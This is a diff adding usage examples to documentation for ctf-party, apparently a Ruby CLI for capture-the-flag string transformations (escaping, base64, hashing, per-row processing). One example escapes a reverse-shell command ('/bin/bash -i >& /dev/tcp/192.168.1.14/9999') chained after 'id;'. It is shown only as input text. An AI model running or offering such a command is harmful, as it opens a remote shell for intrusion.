@@ -72,13 +72,65 @@ $ ctf-party 'security' to_hex
 
 $ ctf-party 'NzQ2Zjc0NmY=' from_b64 hex2bin
 01110100011011110111010001101111
+```
 
+Use native ruby String methods as well as those from ctf-party:
+
+```
+$ ctf-party 'id; /bin/bash -i >& /dev/tcp/192.168.1.14/9999 0>&1' shellescape
+id\;\ /bin/bash\ -i\ \>\&\ /dev/tcp/192.168.1.14/9999\ 0\>\&1
+
+$ ctf-party noraj capitalize reverse
+jaroN
+```
+
+It's possible to read from STDIN:
+
+```
 $ curl -s https://example.org | ctf-party - htmlescape
 &lt;!doctype html&gt;
 &lt;html&gt;
 &lt;head&gt;
     &lt;title&gt;Example Domain&lt;/title&gt;
 ...
+```
+
+It's possible to apply the transformation to each row instead of the whole string:
+
+```
+$ seq 1 10 | ctf-party - to_b64 --row
+MQ==
+Mg==
+Mw==
+NA==
+NQ==
+Ng==
+Nw==
+OA==
+OQ==
+MTA=
+
+$ curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Malware/conficker.txt | ctf-party - leet md5 --row
+dcddb75469b4b4875094e14561e573d8
+29c3eea3f305d6b823f562ac4be35217
+dd4b21e9ef71e1291183a46b913ae6f2
+6fb42da0e32e07b61c9f0251fe627a9c
+b0baee9d279d34fa1dfd71aadb908c3f
+96e79218965eb72c92a549dd5a330112
+7fa8282ad93047a4d6fe6111c93b308a
+...
+
+$ cook 'ABC*1-10' | ctf-party - alternatecase succ --row
+aBd
+aBcAbD
+aBcAbCaBd
+aBcAbCaBcAbD
+aBcAbCaBcAbCaBd
+aBcAbCaBcAbCaBcAbD
+aBcAbCaBcAbCaBcAbCaBd
+aBcAbCaBcAbCaBcAbCaBcAbD
+aBcAbCaBcAbCaBcAbCaBcAbCaBd
+aBcAbCaBcAbCaBcAbCaBcAbCaBcAbD
 ```
 
 ## Console
